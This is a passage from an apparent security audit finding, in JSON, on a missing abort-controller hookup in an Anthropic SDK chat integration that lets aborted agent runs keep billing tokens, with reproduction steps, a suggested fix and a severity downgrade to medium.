unset and `canUseTool` auto-approving every tool, a runaway multi-turn agent cannot be cancelled — direct, uncapped cost runaway plus a leaked server-side query process per aborted chat.","reproduction":"1. Configure an Anthropic credential and open an AI chat (scope=site). 2. Send a prompt that triggers a long/multi-tool response. 3. Click abort in the UI or close the tab (aborts `req.signal`). 4. Observe via the `[ai/anthropic] cache hit=...` / usage logs that the SDK query keeps running and recording usage after the client is gone — tokens keep being billed.","evidence":"const options: Options = {\n    systemPrompt: req.systemPrompt,\n    model: req.modelId,\n    cwd: process.cwd(),\n    mcpServers: { ai_tools: mcpServer },\n    includePartialMessages: true,\n    skills: [],\n    disallowedTools: DISALLOWED_TOOLS,\n    canUseTool: async (_name, input) => ({ behavior: 'allow', updatedInput: input }),\n  }","suggestedFix":"Create an `AbortController` (or reuse `req.signal`) and pass it as `options.abortController` in `buildQueryOptions`; if `req.signal` is already aborted, abort the controller immediately, and add a `req.signal` listener that calls `controller.abort()` / `query.interrupt()` so the agent loop stops when the client disconnects.","assessment":"The report is technically accurate and I could not refute it. buildQueryOptions (anthropic.ts:205-231) constructs Options with systemPrompt/model/cwd/mcpServers/includePartialMessages/skills/disallowedTools/canUseTool/env and never wires req.signal into Options.abortController, nor is query().interrupt() ever called. req.signal is only forwarded to ToolContext.signal for in-flight tool handlers. The SDK genuinely exposes abortController (sdk.d.ts:1143) and interrupt() (sdk.d.ts:2027). The OpenAI driver does the right thing (openai.ts:161 passes signal: req.signal), proving this is an Anthropic-specific omission. The consuming ReadableStream has no cancel() handler and emit() swallows enqueue failures, so there is no fallback abort path either. Result: after the admin aborts or closes the tab, the Anthropic agent loop keeps generating and billing tokens server-side until it finishes on its own.\n\nHowever, I downgrade the severity from the reported 'high' to 'medium' for this threat model. The endpoint is strictly admin-gated (requireCapability 'ai.chat'); the actor is a trusted operator, no privilege boundary is crossed, there is no data loss, RCE, or sandbox escape, and it is not reachable by unauthenticated/public requests, untrusted plugins, or imported content. The harm is bounded to the operator's own API spend (cost runaway on their own key) plus a leaked server-side query per aborted chat. That is a genuine resource/cost-hygiene defect worth fixing, but not a security vulnerability — hence medium, not high.","replicationSteps":"Traced end-
